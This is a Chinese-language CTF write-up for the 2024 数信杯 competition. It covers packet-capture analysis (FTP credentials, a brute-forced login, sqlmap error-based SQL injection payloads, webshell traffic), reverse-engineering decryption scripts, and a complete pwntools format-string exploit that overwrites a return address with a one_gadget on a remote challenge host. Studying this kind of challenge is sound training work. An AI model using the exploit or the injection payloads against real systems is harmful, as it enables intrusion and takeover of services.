---
title: '2024 数信杯 Writeup'
description: '1.协议 + 用户名 + 密码'
pubDate: 2024-10-20
author: 'IHK-1'
tags: ['CTF', '数信杯', '2024']
---

# 数据分析
## 1.数据分析1
1.协议 + 用户名 + 密码

<!-- 这是一张图片，ocr 内容为：WIRESHARK  追踪 TCP 流(TCP.STREAM EQ 2).CATCAPNG 220 HTTP://WWW.AQ817.CN USER R ADMIN 331 PASSWORD REQUIRED FOR ADMIN. PASS ADMIN123 230 USER ADMIN N LOGGED UTF8ON OPTS ALID. 501 UTF8 NOT S SUPPORTED IS INVALI PWD 257 "/" IS CURRENT DIRECTORY. -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1713088234072-9635ca99-5bfd-4daa-80cf-cb066be6cc62.png)

2.总计传输多少文件

<!-- 这是一张图片，ocr 内容为：WIRESHARK 导出FTP-DATA对象列表 文本过滤器: ALL CONTENT-TYPES CONTENT TYPE: 文件名 大小 内容类型 主机名 分组 632 BYTES 75.PNG 4646 192.168.182.1 FTP FILE 4703 192.168.182.1 FTP FILE 662  BYTES 76.PNG 4760 664 BYTES 77.PNG 192.168.182.1 FTP FILE 669 BYTES 78.PNG 4817 192.168.182.1 FTP FILE 4874 642 BYTES 79.9NG 192.168.182.1 FTP FILE 4931 192.168.182.1 FTP FILE 674 BYTES  80.PNG 4988 192.168.182.1 FTP FILE 675 BYTES  81.PNG 5045 192.168.182.1 FTP FILE 645 BYTES 82.PNG 192.168.182.1 FTP FILE 5102 642  BYTES  83.PNG 5159 192.168.182.1 FTP FILE 655 BYTES 84.PNG 5216 664 BYTES 85.PNG 192.168.182.1 FTP FILE 5273 192.168.182.1 FTP FILE 642 BYTES  86.PNG 5330 691 BYTES  87.PNG 192.168.182.1 FTP FILE 192.168.182.1 FTP FILE 5387 631 BYTES 88.PNG 645 BYTES 89.PNG 5444 192.168.182.1 FTP FILE 192.168.182.1 FTP FILE 5501 658 BYTES 90.PNG 5558 192.168.182.1 FTP FILE 671 BYTES 91.PNG 642 BYTES 92.PNG 192.168.182.1 FTP FILE 5615 5672 192.168.182.1 FTP FILE 649 BYTES 93.PNG 5731 634 BYTES 94.PNG 192.168.182.1 FTP FILE 192.168.182.1 FTP FILE 5790 674 BYTES 95.PNG 5849 649 BYTES 96.PNG 192.168.182.1 FTP FILE 5908 681 BYTES 97.PNG 192.168.182.1 FTP FILE 5967 192.168.182.1 FTP FILE 678  BYTES 98.PNG 672 BYTES 99.PNG 6026 192.168.182.1 FTP FILE 6085 192.168.182.1 FTP FILE 659 BYTES 100.PNG 192.168.182.1 FTP FILE 32 BYTES KEY.TXT 6161 全部保存 关闭 保存 帮助 PREVIEW -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1713088393918-3ba8c6a2-910d-4cb6-b114-9ecb119b3dec.png)

```plain
101 key.txt
```

## 2.数据分析3
1.爆破账号

<!-- 这是一张图片，ocr 内容为：TIMESTAMPS [SEQ/ACK ANALYSI TCP PAYLOAD (530 BYTES) HYPERTEXT TRANSFER PROTOCOL POST /POST.PHP HTTP/1.1\R\N [EXPERT INFO (CHAT/SEQUENCE): POST /POST.PHP HTTP/1.1\R\N] REQUEST METHOD: POST REQUEST URI:/ POST PHP REQUEST VERSION: HTTP/1.1 HOST:172.16.5.143\R\N CONNECTION: KEEP-ALIVE\R\N CONTENT-LENGTH:62\R\N ACCEPT:*/*/N X-REQUESTED-WITH: XMLHTTPREQUEST\R\N GECKO) CHROME/109.0.0.0 SAFARI/537.36\R\N USER-AGENT: MOZILLA/5.0 (M 9 (WINDOWS NT 10.0; WIN64; X64) APPLEWEBKIT/537.36 (KHTML, LIKE GECKO) APPLICATION/X-WWW-FORM-URLENCODED\R\N CONTENT-TYPE:APP ORIGIN:HTTP://172.16.5 6.5.143\R\N REFERER:HTTP://172.16.5.143/ADMIN.PHP\R\N ACCEPT-ENCODING: GZIP,DEFLATE/R/N ACCEPT-LANGUAGE: ZH-CN,ZH;Q-0.9\R\N COOKIE: CODEIMG-6291\R\N IN HTTP://172.16.5.143/POST.PHPL FULL REQUEST URI: [HTTP REQUEST 1/6] SE IN FRAME: 340901 RESPONSE INEXT REQUEST IN FRAME: 34094L FILE DATA:62 BYTES HTML FORM URL ENCG LENCODED "ADMIN" ITEM: FORM USE ADMIN@WEZXC WORD" ITEM: FORM TEM FORM ADMINLOG FORM ITEM: -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1713088624141-a2d50ca8-8793-45ff-932a-03832b63fca7.png)

```plain
admin:dmin@QWEzxc
```

2.thekey

<!-- 这是一张图片，ocr 内容为：WIRESHARK 追踪 TCP 流(TCP.STREAM EQ 310).PCAPNG LLITEL THEN THEN THEN THER IN THETTRE THER THER THER AND RED TERT RE THEN THER TER TER TER TH THE IR SETS%20GROUP%20BY%20X%29A%29%20AND%20%27RGKG%27%3D%27RGKG HTTP/1.1 ACCEPT-LANGUAGE:EN-US,EN;Q-0.5 ACCEPT-ENCODING: GZIP,DEFLATE HOST:172.16.5.143 EPT:TEXT/HTML,APPLICATION/XHTML+XML,APPLICATION/XML;Q-0.9,*/*;Q-0.8 ACCEPT:TE USER-AGENT:SQLMAP/1.0.8.16#DEV (HTTP://SQLMAP.ORG) ACCEPT-CHARSET:IS0-8859-15,UTF-8;Q-0.7,*;Q-0.7 CONNECTION:CLOSE PRAGMA:NO-CACHE CACHE-CONTROL: NO-CACHE,NO-STORE HTTP/1.1 200 OK DATE:TUE,24 0CT 2023 08:39:19 GMT SERVER:APACHE/2.2.26 (UNIX) PHP/5.2.17P1 X-POWERED-BY: PHP/5.2.17P1 CONNECTION: CLOSE TRANSFER-ENCODING:CHUNKED CONTENT-TYPE:TEXT/HTML 8B87 IFFB:'1' AND CATID!''G' AND BRANDID-'S' AND (SELECT 7359 FROM(SELECT COUNT("),C (/TD>/TR>/TABLE><B>DATABASE ERROR;//B> INVALID SQL; SQL; SELECT COUNT(ED) FROM PWN,SHOP-CON WHERE .CHARACTER SETS GROUP BY X)A) AND 'RGKG''RGKE' <HR> <B>MYSQL ERROR</B>:1062 (DUPLICATE ENTRY 'QBY JQD1 JQD124759C42CDF90CQQVPQ1 FOR KEY   GROUP KEY')<BR> HA DBBASE SQ1--HALC(INVAIID SQL; SELECT COUNET COUNE SELECT COUNERE. MMERE. IFFB;;1. AND CATID B " AND BRANDIDE'5' AND (SELECT 7359 FROM(SELECT COUNT(*),CONCAT(EX7162706A71, SELECT MID(IFNULL(CAST(THEKEY AS CHAR),OX20)),1,54) FROM WEL FRON  UNEBOUNB-RNN SEY ORD(0)  FRAM  SORET 8,LIN, SETS  FLCOR(RRND(ER  FRAM  ERONATIONEIN,CHER SETS G P BY X)A) AND 'RGKG'-'RGKG' ) CALLED AT [/PHPSTUDY/WWW/INCLUDES/DB.INC.PHP:54] #1 DBBASE SQL->QUERY(SELECT COUNT(ID) FROM (P)-SHOP_CON WHERE IFFB-'1' AND CE ND CATID:''S' AND BRANDID:'5' AND (SELECT 7359 FRON(SELECT COUUT('),CONCAT(EX7162786A71,(SELECT HID( IFNULL(CAST(THEKEY AS CHAR),EX20)),1,54) FROH WEBAWEB.PWN KEY ORDER BY THEKEY LIM LTHIT O,1).0X71767071,FLOOR(RAND(RAND(0)*2)X FRON INFORVATION SCHEMARACTERACTER SETS GROUP BY X)A) AL KEY LIMIT 0, D'RGKG'-'RGKG' ) CALLED AT [/PHPSTUDY/WNW/INCLUDES/COMMON.INC.PHP:1162] UDY/WWW/SHOP/MODULE/SHOPQUERY.PHP:151] #3 SHOPQUERY() CALLED AT [/PHPSTUDY/WWW/INCLUDES/COMMON.INC.PHP:551] #4 PRINTPAGE() CALLED AT [/PHPSTUDY/WWW/SHOP/CLASS/INDEX.PHP:11] ER SETS GROUP BY X)A) AND 'RGKG'-'RGKG" ORDER BY UPTIME DESC LIMIT 0,9-9-BR> <B>MY5QL ERROR</B>: 1962 (DUPLICATE ENTRY 'QBPJQD124759C42CDF90CQQYPQI' FOR KEY '8RO EY GROUP KEY' Y'(BR> #O DBBASE,SQL--HALT(INVALID SQL: SELECT * FROM PWN SHOP.CON WHERE IFFB;'1' AND CATID!:"O' " G', AND BRANDIDE'S' AND (SELECT 7359 FRON(SELECT COUNT(*),CONCAT(EX7162706A71,(SELECT M ID((IFNULL(CAST(THEKEY AS CHAR),OX20)),1,54) FRON DESC LIMIT O,9) CALLED AT [/PHPSTUDY/WWW/INCLUDES/DB.INC.PHP:54] ) AND 'RGKG''RGKG' ORDER BY UPTIME DESC LIMIT O -'RGKS' ORDER BY UPTANE DESC LIMIT 8,9) CALLED AT (PHPSTUDY/SHPSTUDY/SHOP/MODULE/SHOPQUERY.PHP:ISO] #2 SHOPQUERY() CALLED AT [/PHPSTUDY/WWW/INCLUDES/COMMON.INC.PHP:551] #3 PRINTPAGE() CALLED AT [/PHPSTUDY/WWW/SHOP/CLASS/INDEX.PHP:11] KIDOCTYPE HTNL PUBLIC "-/ABB//OTD XHTIL  1.9 STRICT//EN" "HTTP://WMM.N3.ORB/TR/SHTALL/OTD/SHTMLL-STRI <HTML XN 1 XMLNS-"HTTP://WWW.W3.ORG/1999/XHTML"> <HEAD> <META HTTP-EQUIV:"CONTENT-TYPE" CONTENT:"TEXT/HTML; CHARSET-UTF-8" <TITLE>............ ...</TITLE> &META CONTENT-"N 分组28010,1客户端 分组,26服务最分组,1 TURN(S)点击选择, SHOW DATA AS 整个对话(33KB) 310 ASCIL 查找下一个N) 查找 打印 返回 滤拍出盗 垫胁 搜索 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1713088718160-1d92315a-7db2-4a72-8170-b6307818af4b.png)

3.数据库账号密码

```plain
报错注入 D124759C42CDF90C
```

<!-- 这是一张图片，ocr 内容为：LENGTH:380 RECIPE INPUT LINES: 1 A0ZAAAF7POSWAHAKCINBYV2+36/ISS7K/VEKJGRIS69ZDOBIB69FYNXOB3NETISKJGRITMFTMFTZTEIDZVIYXDLVII7CIRKY FROM BASE64 I7GGOJUSPVEDRDCLRZTGFUPSTEAF9JBIBII7GGOJU8341NDACIRTAXRIVX3SPSJODHRWOIBYNTCYLJEZLJYUNTKELYI7ELYI7EBO ALPHABET JLSOFLSOTLSOTLSOTLSOTLSOELSOTLSOTLSOTLSOTLSETLSETLSNKC80/PMYYNDN2NMNNCIGWAHBZDHYKES93CKO6ZHZHZWMN A-ZA-ZO-9+/三 MDC5CG REMOVE NON-ALPHABET CHARS STRICT MODE TIME: 1MS LENGTH: 283 OUTPUT 24 LINES: KM.IGU<?PHP #[EYXY $DBHOST-"LOCALHOST"; $DBNAME-"WEBAWEB"; $DBUSER-"WEBUSER"; $DBPASS "1Q2W3E4R5T6Y"; #[EY%ICXG] $TABLEPRE"PWN"; BAKE! STEP AUTO BAKE #[01NO1 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1713088804190-bd9fd090-0e90-42c8-897d-931295f05c69.png)

```plain
webuser:1q2w3e4r5t6y
```

## 3.数据分析5
1.key

<!-- 这是一张图片，ocr 内容为：X WWW.PCAPNG 文件(编辑() 帮助(H) 分析(A)统计(S) 电话(W) 工具() 工具() 电话(A)无线(W)无线(W)无线(W) 工具() 统计() 跳转(G)捕获(C) 视图 QQQH 1 0 11X HTTP LENGTH INFO PROTOCOL DESTINATION 58.58.58.216 HTTP 172.16.5.135 43224 105.254103 364 HTTP/1.1 200K (TEXT/HTML) 172.16.5.135 43229 105.257415 58.58.58.216 HTTP 581 ET /ENDEX PAZ;A237328338ETD 5UBETRZ8CCR3338861767333333333333333333333333333333333333333333333333 HTTP 43236 105.267856 172.16.5.135 58.58.58.216 364 HTTP/1.1 200 OK (TEXT/HTML) 172.16.5.135 HTTP 58.58.58.216 43239 105.271199 HTTP 172.16.5.135 43246 105.280006 58.58.58.216 375 HTTP/1.1 200 OK (TEXT/HTML) 58.58.58.216 HTTP 172.16.5.135 43247 105.283196 43256 105.293597 58.58.58.216 HTTP 172.16.5.135 363 HTTP/1.1 200 OK (TEXT/HTML) HTTP 43269 105.319474 172.16.5.135 1051 GET (INDEL _ 45224 115.821356 HTTP 172.16.5.135 58.58.58.216 497 HTTP/1.1 200 OK (TEXT/HTML) 45225 115.825622 58.58.58.216 HTTP 172.16.5.135 58.58.58.216 47049 124,244726 172,16.5.135 605 POST /SHELL.PHP HTTP/1.1 (APPLICATION/X-WIWIFORM-URLENCODED) 433 HTTP/1.1 200 OK (TEXT/HTML) 172.16.5.135 58.58.58.216 753 POST /SHELL.PHP HTTP/1.1 (APPLICATION/X-WWW-FORM-URLENCODED) 58.58.58.216 172.16.5.135 590 HTTP/1.1 200 OK (TEXT/HTML) 58.58.58.216 47786 128.439579 172.16.5.135 58.58.58.216 172.16.5.135 743 POST /SHELL.PHP HITP/1.1 (APPLICATICN/X-WNW-FORA-URLENCODED) 47909 130.300240 HTTP 58.58.58.216 589HTTP/1.1200 OK (TEXT/HTML) 172.16.5.135 47911  130.302203 HTTP 172.16.5.135 48484 132,406888 782 POST /SHELL.PHP HTTP/1.1 (APPLICATION/X-WHW-FORM-URLENCODED) 58.58.58.216 HTTP 130 HTTP/1.1 200 OK (TEXT/HTML) 172.16.5.135 48488 132.480074 HTTP 58.58.58.216 FRAME 47049: 605 BYTES ON WIRE (4840 BITS), 605 BYTES CAPTURED IPTURED (4840 BITS) ON INTERFACE IDEVICEVICEVWPF_(FSA62CA-70D3-4F72-BAAC-58EC364E8166), ID O PO : HUAWEITECHNO 97:97:95:B1 (20:F1:7C:97:95:B1), DST: VHWE  ETHERNET IN, SRC: HI 3100 T: VNWARE 20:13:BD (00:0C:29:20:13:BD) 34 2723 COCOL VERSION 4, SRC: 58.58.58.216, DST: 172.16.5,135 0110 INTERNET PROTOCOL VER TRANSEISSION CONTROL PROTOCOL, SRC PORT: 54859, DST PORT: 89, SEQ: 1461, ACK: 1, LEN: 551 0120 (2 REASSEMBLED TCP SEGNENTS (2011 BYTES): #47048(1460), #470 0130 #47049(551)] 花苑 HYPERTEXT TRANSFER PROTOCOL 0140 HIML FORN URL ENCODED: APPLICATION/X-WUW-FORM-URLENCODED 74 KEY: 4325376189164835*8 53761 6 01D0 01E0 01F0 0200 0210 SESS 0220 0230 OYTOS) 分组:96723:已品示:5206(5.49) 配置:DEFAULT TEXT ITEM (TEXD),1.767 BYTE(S) -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1713089065862-0cf3148e-728a-476e-8a36-592e66f602ed.png)

```plain
蚁剑 4825376109164835
```

# 数据安全
## <font style="color:rgb(51, 51, 51);">1.re_ds001</font>
```plain
def dec(data):
    return bytes([((b >> 3) | (b << 5 & 0xff)) for b in data])


with open(r"C:\Users\86158\Desktop\REVERSE\re_ds001\en_file_data.enf", 'rb') as f:
    enc = f.read()
enc = dec(enc)
# for i in range(len(enc)):
#     enc[i] = bytes((enc[i] >> 3) | (enc[i] << 5 & 0xff))
with open(r"C:\Users\86158\Desktop\REVERSE\re_ds001\enc.txt", 'wb') as ff:
    ff.write(enc)
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2024/png/35230263/1713073277235-d87f4e43-10f4-45ac-9f15-f2ce8d6dfff8.png#averageHue=%23f7f5f3&clientId=u689f9fc7-22a1-4&from=paste&height=695&id=u99135182&originHeight=869&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=204732&status=done&style=none&taskId=u30d33536-c31e-491d-a8c1-4a7ddc52661&title=&width=1536)

## <font style="color:rgb(51, 51, 51);">2.re_ds002</font>
<font style="color:rgb(51, 51, 51);">从这个函数可以看出为rc4加密</font><!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2024/png/35230263/1713083580996-97b6674c-a8ee-4d0a-9429-120d564ed41c.png#averageHue=%234f4e4c&clientId=u7b55ad9e-19b6-4&from=paste&height=510&id=ucf563bd6&originHeight=637&originWidth=694&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=51098&status=done&style=none&taskId=ud2896e41-d4f4-4e25-b829-6f20a3a540e&title=&width=555.2)<font style="color:rgb(51, 51, 51);">根据mian函数中内容，在密文后面添加了'\r\n'进行分隔，根据题目要求，只需要第八行数据，所以找到第八个组密文，然后进行动调，将密文输入解密</font><font style="color:rgb(51, 51, 51);">添加一个参数，在进行动调</font><!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2024/png/35230263/1713085226035-f1224ae3-73d0-4aed-bf52-43811041b1dc.png#averageHue=%233f3e3d&clientId=ub80e3a61-afb2-4&from=paste&height=815&id=u0df893c3&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=211956&status=done&style=none&taskId=ucc20e137-e79b-406f-8e42-ff98a3da8bb&title=&width=1536)<font style="color:rgb(51, 51, 51);">这里下个断点</font><!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2024/png/35230263/1713085255835-e90e265a-4991-4b60-bc91-9d97ee8dbdf6.png#averageHue=%2372716f&clientId=ub80e3a61-afb2-4&from=paste&height=793&id=u41658cf8&originHeight=991&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=161916&status=done&style=none&taskId=u17e7e2c9-3212-4890-a519-5677022e0cc&title=&width=1536)<font style="color:rgb(51, 51, 51);">修改ZF，使其能跳到正确路径</font><font style="color:rgb(51, 51, 51);">再下个断点</font><!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2024/png/35230263/1713085423208-a97f8331-8ab8-4481-8470-426a4e875832.png#averageHue=%23474544&clientId=ub80e3a61-afb2-4&from=paste&height=793&id=uaf5066d8&originHeight=991&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=194349&status=done&style=none&taskId=ufbf104f9-c4af-47da-9dc3-4d27bd9109a&title=&width=1536)<font style="color:rgb(51, 51, 51);">修改Buffer的内存，数据如下</font><!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2024/png/35230263/1713085159211-6095a97b-94ed-4465-9050-6d3e4a948558.png#averageHue=%23ebd280&clientId=ub80e3a61-afb2-4&from=paste&height=695&id=ufd467432&originHeight=869&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=244981&status=done&style=none&taskId=u3d406e06-be43-4d5a-ae5d-48074a21c14&title=&width=1536)<font style="color:rgb(51, 51, 51);">继续调试，得到明文</font><!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2024/png/35230263/1713085142073-58d3e7ba-a9b1-46d4-ae0e-2000f91aabba.png#averageHue=%234f4e4c&clientId=ub80e3a61-afb2-4&from=paste&height=178&id=u3ed221df&originHeight=223&originWidth=1167&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31364&status=done&style=none&taskId=u86453ef3-3653-41cc-a064-179543344f6&title=&width=933.6)

## <font style="color:rgb(51, 51, 51);">3.pb</font>
```plain
from pwn import *
from ctypes import *
from struct import pack
banary = "./pb"
elf = ELF(banary)
libc = ELF("./libc-2.23.so")
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
ip = '47.116.162.255'
port = 32941
local = 0
if local:
    io = process(banary)
else:
    io = remote(ip, port)

context(log_level = 'debug', os = 'linux', arch = 'amd64')
#context(log_level = 'debug', os = 'linux', arch = 'i386')

def dbg():
    gdb.attach(io)
    pause()

s = lambda data : io.send(data)
sl = lambda data : io.sendline(data)
sa = lambda text, data : io.sendafter(text, data)
sla = lambda text, data : io.sendlineafter(text, data)
r = lambda : io.recv()
ru = lambda text : io.recvuntil(text)
uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
iuu32 = lambda : int(io.recv(10),16)
iuu64 = lambda : int(io.recv(12),16)
uheap = lambda : u64(io.recv(12).ljust(8,b'\x00'))
lg = lambda data : io.success('%s -> 0x%x' % (data, eval(data)))
ia = lambda : io.interactive()

ru("How to do?")
sl(b'%11$p.%27$p')
ru('0x')
libcbase=iuu64()-0x20840
lg("libcbase")
one=[0x45226,0x4527a,0xf03a4,0xf1247]
one_gadget=libcbase+one[0]
system=libcbase+libc.sym['system']
lg("one_gadget")

printf_got=elf.got['printf']

ru('0x')
stack=iuu64()
lg("stack")
num=stack-0x100+7
ret_addr=stack-0xf0

ru("How to do?")
payload='%'+str((num)&0xffff)+'c'+'%27$hn'
sl(payload)

ru("How to do?")
payload='%'+str(0xff)+'c'+'%41$hhn'
sl(payload)

ru("How to do?")
payload='%'+str((ret_addr)&0xff)+'c'+'%27$hhn'
sl(payload)

ru("How to do?")
payload='%'+str(one_gadget&0xff)+'c'+'%41$hhn'
sl(payload)

ru("How to do?")
payload='%'+str((ret_addr+1)&0xff)+'c'+'%27$hhn'
sl(payload)

ru("How to do?")
payload='%'+str((one_gadget>>8)&0xff)+'c'+'%41$hhn'
sl(payload)

ru("How to do?")
payload='%'+str((ret_addr+2)&0xff)+'c'+'%27$hhn'
sl(payload)

ru("How to do?")
payload='%'+str((one_gadget>>8>>8)&0xff)+'c'+'%41$hhn'
sl(payload)

ru("How to do?")
payload='%'+str((ret_addr+3)&0xff)+'c'+'%27$hhn'
sl(payload)

ru("How to do?")
payload='%'+str((one_gadget>>8>>8>>8)&0xff)+'c'+'%41$hhn'
sl(payload)


ru("How to do?")
payload='%'+str((num)&0xff)+'c'+'%27$hhn'
sl(payload)

ru("How to do?")
payload='%'+str(0x0)+'c'+'%41$hhn'
sl(payload)

ia()
```

